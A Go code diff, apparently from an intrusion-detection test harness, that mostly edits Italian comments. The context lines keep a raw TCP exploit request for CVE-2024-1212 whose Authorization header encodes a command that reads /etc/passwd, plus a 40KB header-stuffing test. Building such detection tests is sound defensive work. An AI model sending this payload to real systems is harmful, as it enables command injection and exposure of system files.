@@ -48,8 +48,7 @@ func runCurl(target, method, endpoint string, headers map[string]string, dataFil
 	}
 }
 
-// NUOVA FUNZIONE: Invia pacchetto RAW TCP (Replica esatta di Netcat)
-// Serve per aggirare le idiosincrasie di Curl su regole Suricata molto rigide
+// Invio pacchetto RAW TCP (Replica esatta di Netcat per CVE-2024-1212)
 func runRawCVE(host, port string) {
 	fmt.Printf("\n⚔️  TEST: CVE-2024-1212 (RAW TCP Socket) [Chiaro/Suricata]\n")
 	fmt.Printf("   👉 Connessione diretta a %s:%s... ", host, port)
@@ -61,9 +60,6 @@ func runRawCVE(host, port string) {
 	}
 	defer conn.Close()
 
-	// Costruiamo il payload ESATTAMENTE come nel test 'nc' che ha funzionato.
-	// URI: 35 chars esatti.
-	// Header Authorization: Spaziatura perfetta.
 	payload := "GET /access/set?param=enableapi&value=1 HTTP/1.1\r\n" +
 		"Host: " + host + ":" + port + "\r\n" +
 		"Authorization: Basic O2NhdCAvZXRjL3Bhc3N3ZDs=\r\n" +
@@ -77,7 +73,7 @@ func runRawCVE(host, port string) {
 		return
 	}
 	
-	// Leggiamo un po' della risposta per assicurarci che sia partita
+	// Leggiamo la risposta per assicurarci che sia partita
 	buf := make([]byte, 1024)
 	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
 	_, _ = conn.Read(buf) // Ignoriamo errori di timeout, ci basta aver inviato
@@ -91,7 +87,7 @@ func runDualTest(name, method, endpoint string, headers map[string]string, dataF
 	fmt.Printf("\n⚔️  TEST: %s [%s]\n", name, proto)
 	// 1. HTTPS (eBPF)
 	runCurl(TargetHTTPS, method, endpoint, headers, dataFile, proto, "Criptato/eBPF")
-	// 2. HTTP (Suricata)
+	// 2. HTTP (Suricata e Snort)
 	runCurl(TargetHTTP, method, endpoint, headers, dataFile, "h1", "Chiaro/Suricata")
 	
 	time.Sleep(500 * time.Millisecond)
@@ -146,9 +142,7 @@ func main() {
 	runDualTest("Stuffing HTTP/2 (Header Frame)", "GET", "/", stuffingHeaders, "", "h2")
 	
 	// --- 4. TEST HEADER STUFFING (Violazione Limite Suricata) ---
-	// Il default di Suricata è 32KB (32768 bytes).
 	// Creiamo un header di 40KB per forzare un'anomalia di protocollo.
-	// Nota: Curl potrebbe lamentarsi "Argument list too long" se esageriamo, ma 40KB dovrebbe reggerli.
 	junkSize := 40000 
 	fmt.Printf("\nGenerating %d bytes header...\n", junkSize)
 	hugeHeader := strings.Repeat("A", junkSize)
